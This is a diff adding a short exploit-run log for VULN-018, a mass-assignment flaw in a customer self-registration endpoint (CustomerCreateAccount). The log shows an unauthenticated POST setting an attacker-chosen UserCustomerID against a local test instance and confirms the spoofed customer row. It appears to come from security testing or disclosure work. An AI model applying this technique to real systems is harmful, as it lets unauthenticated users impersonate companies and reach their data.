@@ -1,0 +1,10 @@
+==========================================================================
+VULN-018: CustomerCreateAccount mass-assigns UserCustomerID (unauth self-reg)
+Target: http://localhost:25114
+[INFO] InterfaceCustomer.pm:917-929 binds whole Map from params; UserCustomerID only defaulted
+==========================================================================
+[STEP] unauth POST CustomerCreateAccount with UserCustomerID=VictimCorp-9e6bfb3b
+[INFO] HTTP 200
+[PROOF] created customer_user row: [['attacker_9e6bfb3b@example.test', 'VictimCorp-9e6bfb3b']]
+[OK] exploit confirmed — unauthenticated self-registration created a customer with attacker-chosen CustomerID 'VictimCorp-9e6bfb3b' (mass-assigned UserCustomerID) — identity/company-scope spoofing out of the box.
+==> VULN-018: CONFIRMED — unauthenticated self-registration created a customer with attacker-chosen CustomerID 'VictimCorp-9e6bfb3b' (mass-assigned UserCustomerID) — identity/company-scope spoofing out of the box.
